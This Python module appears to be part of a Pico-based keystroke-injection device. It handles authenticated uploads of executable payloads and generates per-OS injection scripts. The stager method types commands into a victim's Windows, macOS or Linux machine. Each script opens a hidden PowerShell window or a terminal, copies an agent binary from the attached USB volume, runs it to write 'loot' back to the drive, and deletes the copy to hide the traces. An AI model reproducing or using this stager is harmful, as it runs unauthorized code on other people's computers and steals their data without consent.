import gc
import os

from usb import (
    USB_AGENT_UNIX_NAME,
    USB_AGENT_WINDOWS_NAME,
    USBService,
    staged_binary_matches_target,
    staged_binary_name,
    staged_binary_path,
    usb_agent_filename,
)

from ._http import _FILE_CHUNK_SIZE, _MAX_BINARY_SIZE

_ALLOWED_BINARY_EXTENSIONS = {'bin', 'elf', 'exe', 'appimage'}
_PAYLOAD_BIN = USB_AGENT_UNIX_NAME
_PAYLOAD_EXE = USB_AGENT_WINDOWS_NAME
_STAGED_UPLOAD_TEMP = 'payload.upload'
_USB_LOOT_FILE = 'loot-usb.json'
_MACH_O_MAGICS = (
    b'\xfe\xed\xfa\xce',
    b'\xce\xfa\xed\xfe',
    b'\xfe\xed\xfa\xcf',
    b'\xcf\xfa\xed\xfe',
    b'\xca\xfe\xba\xbe',
    b'\xbe\xba\xfe\xca',
    b'\xca\xfe\xba\xbf',
    b'\xbf\xba\xfe\xca',
)


def _sanitize_upload_filename(raw: str) -> str:
    normalized = (raw or '').replace('\\', '/').strip()
    if not normalized:
        return ''
    return normalized.rsplit('/', 1)[-1].strip()


def _is_supported_upload_name(name: str) -> bool:
    if not name or name in {'.', '..'}:
        return False
    if name.startswith('.'):
        return False
    if '.' not in name:
        return True
    extension = name.rsplit('.', 1)[-1].lower()
    return extension in _ALLOWED_BINARY_EXTENSIONS


def _binary_kind(prefix: bytes) -> str:
    if prefix.startswith(b'MZ'):
        return 'windows'
    if prefix.startswith(b'\x7fELF'):
        return 'unix'
    if prefix[:4] in _MACH_O_MAGICS:
        return 'unix'
    return ''


def _looks_like_executable_binary(prefix: bytes) -> bool:
    return bool(_binary_kind(prefix))


def _binary_target_path(kind: str) -> str:
    return _PAYLOAD_EXE if kind == 'windows' else _PAYLOAD_BIN


def _basename(path: str) -> str:
    return path.replace('\\', '/').rsplit('/', 1)[-1]


def _clear_staged_binaries(*, keep: str = '') -> None:
    for candidate in (_PAYLOAD_EXE, _PAYLOAD_BIN, _STAGED_UPLOAD_TEMP):
        if candidate == keep:
            continue
        try:
            os.remove(candidate)
        except OSError:
            pass


class _BinaryMixin:
    _usb: USBService

    # Methods provided by SetupServer / other mixins
    def _is_authorized(self, request) -> bool: ...
    async def _send_json(self, writer, request, status: str, data: dict[str, object]) -> None: ...

    def _has_binary(self) -> bool:
        return bool(staged_binary_path())

    async def _discard_request_body(self, reader, remaining: int) -> None:
        while remaining > 0:
            chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
            if not chunk:
                break
            remaining -= len(chunk)

    def _usb_drive_stager_script(self, target_os: str) -> str:
        agent_name = usb_agent_filename(target_os)
        if target_os == 'windows':
            cmd = (
                'powershell -w hidden -c "$r=(Get-PSDrive -PSProvider FileSystem | % Root | '
                "?{Test-Path ($_ + '"
                + agent_name
                + "')} | select -First 1); if($r){$s=$r + '"
                + agent_name
                + "'; $loot=$r + '"
                + _USB_LOOT_FILE
                + "'; $exe=Join-Path $env:TEMP 'pico_agent.exe'; "
                + 'Copy-Item $s $exe -Force; & $exe --loot-out $loot; '
                + 'Remove-Item $exe -Force -ErrorAction SilentlyContinue}"'
            )
            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'

        if target_os == 'macos':
            cmd = (
                'for d in /Volumes/*; do [ -f "$d/'
                + agent_name
                + '" ] && cp "$d/'
                + agent_name
                + '" /tmp/pico_agent && chmod +x /tmp/pico_agent && '
                + '/tmp/pico_agent --loot-out "$d/'
                + _USB_LOOT_FILE
                + '" ; rm -f /tmp/pico_agent; break; done'
            )
            return (
                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
                'DELAY 600\nSTRING ' + cmd + '\nENTER'
            )

        cmd = (
            'for d in /media/$USER/* /run/media/$USER/* /mnt/*; do [ -f "$d/'
            + agent_name
            + '" ] && cp "$d/'
            + agent_name
            + '" /tmp/pico_agent && chmod +x /tmp/pico_agent && '
            + '/tmp/pico_agent --loot-out "$d/'
            + _USB_LOOT_FILE
            + '" ; rm -f /tmp/pico_agent; break; done'
        )
        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + cmd + '\nENTER'

    def _stager_script(self, target_os: str) -> str:
        return self._usb_drive_stager_script(target_os)

    async def _handle_binary_upload_stream(
        self, reader, writer, partial, content_length: int
    ) -> None:
        if not self._is_authorized(partial):
            await self._send_json(
                writer, partial, '401 Unauthorized', {'message': 'Sign in required.'}
            )
            return

        if not content_length:
            await self._send_json(
                writer, partial, '400 Bad Request', {'message': 'No content received.'}
            )
            return

        fname = _sanitize_upload_filename(partial['headers'].get('x-filename', 'payload.bin'))
        if not _is_supported_upload_name(fname):
            await self._discard_request_body(reader, content_length)
            await self._send_json(
                writer,
                partial,
                '400 Bad Request',
                {
                    'message': 'Upload a compiled EXE, ELF, or Mach-O binary.',
                    'notice': 'error',
                },
            )
            return

        if content_length > _MAX_BINARY_SIZE:
            await self._discard_request_body(reader, content_length)
            await self._send_json(
                writer,
                partial,
                '413 Content Too Large',
                {
                    'message': f'Binary too large (max {_MAX_BINARY_SIZE // (1024 * 1024)} MB).',
                    'notice': 'error',
                },
            )
            return

        written = 0
        prefix = b''
        try:
            gc.collect()
            _clear_staged_binaries(keep=_STAGED_UPLOAD_TEMP)
            with open(_STAGED_UPLOAD_TEMP, 'wb') as f:
                remaining = content_length
                while remaining > 0:
                    chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
                    if not chunk:
                        break
                    if len(prefix) < 8:
                        prefix += chunk[: 8 - len(prefix)]
                    f.write(chunk)
                    written += len(chunk)
                    remaining -= len(chunk)
        except (OSError, MemoryError):
            _clear_staged_binaries()
            await self._send_json(
                writer,
                partial,
                '500 Internal Server Error',
                {'message': 'Write failed. Check available flash space.', 'notice': 'error'},
            )
            return

        kind = _binary_kind(prefix)
        if not kind:
            _clear_staged_binaries()
            await self._send_json(
                writer,
                partial,
                '400 Bad Request',
                {
                    'message': 'Only executable EXE, ELF, or Mach-O binaries can be uploaded.',
                    'notice': 'error',
                },
            )
            return

        target_path = _binary_target_path(kind)
        try:
            try:
                os.remove(target_path)
            except OSError:
                pass
            os.rename(_STAGED_UPLOAD_TEMP, target_path)
            _clear_staged_binaries(keep=target_path)
        except OSError:
            _clear_staged_binaries()
            await self._send_json(
                writer,
                partial,
                '500 Internal Server Error',
                {
                    'message': 'Binary staging failed while finalizing the USB payload file.',
                    'notice': 'error',
                },
            )
            return

        if self._usb.set_mounted(True).get('mounted'):
            self._usb.refresh()
        usb_agent = self._usb.state()
        usb_agent['has_binary'] = self._has_binary()

        await self._send_json(
            writer,
            partial,
            '200 OK',
            {
                'message': f'Binary uploaded ({written} bytes).',
                'notice': 'success',
                'size': written,
                'filename': _basename(target_path),
                'usb_agent': usb_agent,
            },
        )

    def _binary_target_notice(self, target_os: str) -> str:
        if target_os == 'windows':
            return 'Upload a Windows PE binary before injecting into Windows targets.'
        return 'Upload a Linux or macOS ELF/Mach-O binary before injecting into this target.'

    def _binary_matches_target(self, target_os: str) -> bool:
        return staged_binary_matches_target(target_os)

    def _staged_binary_name(self) -> str:
        return staged_binary_name()
